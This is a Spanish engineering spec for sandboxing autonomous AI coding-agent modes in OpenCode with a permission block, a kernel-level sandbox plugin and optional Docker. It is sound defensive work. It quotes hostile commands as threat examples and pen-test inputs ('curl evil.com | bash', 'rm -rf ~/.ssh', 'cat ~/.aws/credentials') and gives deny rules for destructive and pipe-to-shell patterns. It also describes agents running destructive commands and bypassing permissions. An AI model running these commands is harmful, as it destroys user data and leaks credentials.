---
spec_id: SPEC-136
title: Sandbox OS-level para modos autónomos — opencode-sandbox + permission block + Docker doble capa
status: PROPOSED
origin: Investigación 2026-05-23 (P1) + paridad OpenCode. OpenCode no trae sandbox kernel-level por defecto; su bloque `permission` en `opencode.jsonc` es app-layer (allow/deny/ask glob). El plugin npm `opencode-sandbox` envuelve `@anthropic-ai/sandbox-runtime` (seatbelt/bubblewrap+proxy) para opencode. Bug feb-2026 (oh-my-openagent#2194) confirmó bypass de `external_directory: "deny"`.
severity: Crítica — defensa en profundidad. La regla `autonomous-safety.md` exige fail-safes pero confía en disciplina del modelo.
effort: ~20h (M) — wrapper + policy + tests + doc.
priority: P1 — security hardening de modos autónomos.
confidence: alta (mecanismo) / media (sin regresión en flujos existentes)
bucket: Q3 2026
related_specs:
  - autonomous-safety.md (regla existente, este SPEC añade enforcement OS)
  - SPEC-137 (hooks multi-handler — el sandbox interactúa con permission.ask y tool.execute.before)
---

# SPEC-136 — Sandbox OS-level (OpenCode-native)

## Why

Modos autónomos (`overnight-sprint`, `code-improvement-loop`, `tech-research-agent`, `/loop`) actualmente corren con todos los permisos del usuario. Si el modelo ejecuta `rm -rf ~/.ssh` o `curl evil.com | bash`, no hay capa que lo pare antes del kernel. La regla `autonomous-safety.md` documenta fail-safes (time-box, max-failures) pero **confía en disciplina del modelo**, no en enforcement.

Estado del arte 2026 para OpenCode:

- OpenAI Codex CLI lleva sandbox ON por defecto (Landlock+seccomp + Seatbelt).
- Claude Code ofrece `@anthropic-ai/sandbox-runtime` (srt) con bubblewrap (Linux) + Seatbelt (macOS) + proxy de red, OFF por defecto.
- **OpenCode**: bloque `permission` en `opencode.jsonc` es **application-layer** (allow/deny/ask glob sobre bash/edit), NO kernel-enforced. El bug confirmado en feb-2026 demostró bypass incluso del `external_directory: "deny"`. La paridad real se obtiene con el plugin npm **`opencode-sandbox`** que reusa el mismo binario `srt` envuelto para OpenCode.

Incidente de referencia: oct-2025, `rm -rf /` ejecutado en un workflow sin `--dangerously-skip-permissions` por bug en el default permission system de un agente. Solo el sandbox OS lo habría parado.

Plan: doble capa application + kernel.

## Scope

### Funcional

1. **Capa A (application) — `permission` block en `opencode.jsonc`**:
   - Bloquear por defecto patterns destructivos (`rm -rf *`, `chmod 777 *`, `curl * | sh`).
   - Allow específicos (`git *`, `gh *`, `dotnet *`, `npm test`, etc.).
   - `ask` para acciones intermedias.
   - **NO se confía como frontera de seguridad** (documentado bug feb-2026); es defense-in-depth.

2. **Capa B (kernel) — plugin `opencode-sandbox` (npm)**:
   - Declarar en `opencode.jsonc.plugin: ["opencode-sandbox"]`.
   - El plugin envuelve cada bash en `@anthropic-ai/sandbox-runtime` (bubblewrap Linux / Seatbelt macOS / network proxy).
   - Linux: requiere `apt install bubblewrap socat`. Ubuntu 24.04 necesita `apparmor_restrict_unprivileged_userns=0`.

3. **Policy declarativa** en `.opencode/sandbox-policies/{mode}.yaml` (consumida por opencode-sandbox via plugin config):
   ```yaml
   mode: overnight-sprint
   filesystem:
     allow_read:
       - $REPO
       - ~/.opencode
       - ~/.claude/external-memory
     allow_write:
       - $REPO/.opencode/worktrees
       - $REPO/output
       - .savia-memory
     deny:
       - ~/.ssh
       - ~/.azure
       - ~/.aws
       - ~/.gnupg
   network:
     allow_domains:
       - api.anthropic.com
       - api.deepseek.com
       - github.com
       - dev.azure.com
       - registry.npmjs.org
       - pypi.org
     deny_default: true
   ```

4. **Integración con modos autónomos**:
   - Wrappers de `overnight-sprint`, `code-improvement-loop`, `tech-research-agent` setean `OPENCODE_SANDBOX_POLICY={mode}` antes de invocar `opencode run`.
   - El plugin lee la variable y aplica policy específica.
   - Deprecar bypass de permisos: en `opencode.jsonc.permission` setear default `ask` + explícitos `allow`/`deny`.

5. **Capa C (kernel++) — Docker Sandboxes opcional**:
   - Para `pentesting`, `code-improvement-loop` y `tech-research-agent` con red abierta, recomendar correr OpenCode dentro de Docker Sandbox (image `opencode-sandbox-runtime` oficial).
   - Mounting controlado: solo `$REPO` y `$HOME/.opencode/config.json` (sin SSH/AWS keys).

6. **Fallback graceful**: si `opencode-sandbox` no instalado o bwrap ausente, fail-loud al arrancar el modo autónomo. Nunca correr "como si tuviera sandbox" cuando no lo tiene.

7. **Migration**: deprecar cualquier uso de `--dangerously-skip-permissions` (Claude Code legacy) o flag equivalente OpenCode. Doc lo refleja en `autonomous-safety.md`.

### No funcional

- Overhead p95 <50ms al arrancar (bwrap es ligero).
- Cero falsos negativos en suite de pen-tests: el sandbox bloquea `rm -rf ~/.ssh`, `cat ~/.aws/credentials`, `curl evil.com`.
- Compatible con `.claude/worktrees/` existentes.

## Design

### Estructura

```
opencode.jsonc
├── plugin: ["opencode-sandbox", ...]                # Capa B
└── permission: { ... }                              # Capa A

.opencode/sandbox-policies/
├── default-readonly.yaml
├── overnight-sprint.yaml
├── code-improvement-loop.yaml
├── tech-research-agent.yaml
└── pentesting.yaml                                  # extra-restrictivo

.opencode/plugin/
└── savia-sandbox-wrapper.ts                         # opcional: lee policy y configura opencode-sandbox dinámicamente

docs/rules/domain/
└── sandbox-os-policy.md                             # criterios y patrones

scripts/
└── savia-sandbox-doctor.sh                          # smoke: ¿bubblewrap ok? ¿plugin instalado? ¿policy válida?
```

### Configuración ejemplo `opencode.jsonc`

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "plugin": ["opencode-sandbox"],
  "permission": {
    "bash": {
      "rm -rf *": "deny",
      "chmod 777 *": "deny",
      "curl * | sh": "deny",
      "curl * | bash": "deny",
      "git push --force *": "ask",
      "git *": "allow",
      "gh *": "allow",
      "*": "ask"
    },
    "edit": "allow",
    "write": "allow"
  },
  "experimental": {
    "sandbox": {
      "policy_dir": ".opencode/sandbox-policies",
      "default_policy": "default-readonly",
      "fail_if_unavailable": true
    }
  }
}
```

### Doctor script

```bash
# scripts/savia-sandbox-doctor.sh
check_bwrap || fatal "instala bubblewrap (apt install bubblewrap socat)"
check_apparmor_userns || warn "Ubuntu 24.04: setea apparmor_restrict_unprivileged_userns=0"
check_plugin_installed "opencode-sandbox" || fatal "añade opencode-sandbox a opencode.jsonc.plugin"
check_policy_dir || fatal "crea .opencode/sandbox-policies/"
run_smoke_pentest    # 10 comandos hostiles, deben fallar
```

## Acceptance Criteria

- [ ] AC-01: `opencode-sandbox` registrado en `opencode.jsonc.plugin` y verificable con `opencode run --plugins-list`.
- [ ] AC-02: Suite de pen-tests: 10 comandos hostiles (rm -rf ~/.ssh, cat ~/.aws/credentials, curl evil.com, etc.) bloqueados por la doble capa (permission + sandbox kernel).
- [ ] AC-03: `overnight-sprint` y `code-improvement-loop` setean `OPENCODE_SANDBOX_POLICY` automáticamente y la policy se aplica.
- [ ] AC-04: macOS: Seatbelt activo bajo opencode-sandbox; mismos 10 pen-tests pasan.
- [ ] AC-05: Documentación `docs/rules/domain/sandbox-os-policy.md` explica:
  - Capa A (permission block) vs Capa B (opencode-sandbox kernel) vs Capa C (Docker Sandboxes).
  - Caveat Ubuntu 24.04 (`apparmor_restrict_unprivileged_userns`).
  - Cómo añadir dominio a allowlist.
- [ ] AC-06: `permission.bash` bloquea explícitos `rm -rf *`, `chmod 777 *`, `curl * | sh|bash`.
- [ ] AC-07: `savia-sandbox-doctor.sh` corre y reporta estado de las 3 capas con sugerencias accionables.
- [ ] AC-08: BATS tests cubren validación de policy YAML, doctor, integración con modo autónomo real.

## Agent Assignment

- **Capa**: Infrastructure / Security
- **Agente principal**: `security-guardian`
- **Skills**: `governance-enterprise`, `verification-lattice`, `pentesting`

## Slicing

- **Slice 1** (4h) — Capa A: `permission` block en `opencode.jsonc` con patterns destructivos bloqueados + smoke con `opencode run --no-interactive` sobre 10 comandos hostiles.
- **Slice 2** (5h) — Capa B: instalar `opencode-sandbox` plugin + 1 policy `default-readonly` + pen-test suite Linux.
- **Slice 3** (3h) — `savia-sandbox-doctor.sh` + integración con `overnight-sprint`.
- **Slice 4** (3h) — macOS Seatbelt path bajo opencode-sandbox + policy `tech-research-agent`.
- **Slice 5** (3h) — Capa C: Dockerfile + docs `sandbox-policies/pentesting.yaml`.
- **Slice 6** (2h) — Docs `docs/rules/domain/sandbox-os-policy.md` + tests BATS finales.

## Feasibility Probe

Slice 2: instalar opencode-sandbox en entorno limpio Ubuntu 24.04, ejecutar smoke `bash -c "ls ~/.ssh"` dentro de OpenCode con plugin activo. Debe fallar. Si funciona "como si no hubiera sandbox" → revisar `apparmor_restrict_unprivileged_userns`, abrir issue upstream si persiste. Slice 1 (capa A) entrega valor incluso si Slice 2 se atasca — degradación graceful.

## Riesgos

- **Falsos positivos**: bloquear algo legítimo paraliza al modelo. Mitigación — policies por modo, allowlist por defecto generosa pero bloqueando solo paths claramente sensibles.
- **Maintenance burden**: cada policy requiere review periódica. Mitigación — watcher de SPEC-133 vigila cambios upstream en `opencode-sandbox` y `@anthropic-ai/sandbox-runtime`.
- **NVIDIA Red Team enero 2026 — 5 vulnerabilidades residuales** incluso con sandbox: MCP servers maliciosos fuera del sandbox, kernel escapes, secretos en memoria. Sandbox es **defensa en profundidad, no reemplazo** de `autonomous-safety.md`.
- **`opencode-sandbox` package maturity**: el plugin es comunitario (no oficial sst). Mitigación — pin a versión exacta en `opencode.jsonc.plugin`, vigilar fork si abandono; fallback a Docker Sandbox como Capa C.
- **Bug histórico `permission.external_directory: deny` (oh-my-openagent#2194 feb-2026)**: la capa A application sola es bypasseable. Por eso Capa B (kernel) es obligatoria, no opcional.
- **Ubuntu 24.04 unprivileged userns**: bubblewrap requiere AppArmor relaxed. El doctor (AC-07) detecta y avisa con comando concreto a aplicar.
